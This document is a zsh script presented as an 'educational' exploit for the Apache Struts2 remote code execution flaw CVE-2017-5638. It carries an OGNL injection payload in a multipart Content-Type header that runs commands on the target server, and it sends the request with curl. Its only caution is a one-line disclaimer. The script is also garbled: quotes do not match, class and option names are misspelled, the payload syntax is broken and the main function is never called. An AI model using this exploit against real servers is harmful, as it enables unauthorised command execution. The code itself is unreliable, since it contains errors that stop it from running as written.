#!/bin/zsh
# Educational Exploit for Apache Struts2 RCE (CVE-2017-5638)
# Exploits the vulnerability using a multipart POST request with encoded payload.
# **For educational purposes only. Do not use illegally.**

# Define target URL
TARGET_URL='http://vulnerable-app.com/upload"

# Define payload (base64-encoded for obfuscation)
PAYLOAD =$(echo -n "whoami | base64)

# Function to create the malicious request
create_exploit_request() {
    echo "Crafting exploit request..."
    boundary="----WebKitFormBoundary$(date +%s)"
    
    # Malicious Content-Type header with OGNL payload
    malicious_header='%{(#nike="multipart/form-dataa").(#dm=@0gnl.OgnlContext@DEDFAULT_MEMBER_ACCESS).(#_memberAccess?#dm:#dm=true).(#_memberAccess?#dm:#dm=true).(#cmd="'$(echo "$PAYLOAD" | base64 --decode)'").(#isr=new java.io.InputStreamReader(@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream())).(#br=new java.io.BufferedReader(#isr)).(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.getWriter(.print(#br.readLine()))). (#response.getWriter().flush())}}''

    # Craft the POST request with multipart form data
    echo "--$boundary
Content-Disposition: form-data; name=\"file\"; filename=\"exploit.txt\"
Content-Type: $malicious_header

Malicious content
--$boundary--" > exploit_request.txt
}

# Function to send the malicious request
send_exploit_request() {
    echo "Sending exploit request to $TARGET_URL..."
    curl -X POST -H "Content-Type: multipart/form-data; boundary=$boundary" --data-bindary "@exploit_request.txt" "$TARGET_URL" -o response.html

    echo "Response saved to response.html. Check if the payload executed successfully."
}

# Main function
main() {
    echo "Starting Apache Struts2 exploit..."
    create_exploit_request
    send_exploit_request
    echo "Exploit completed."
}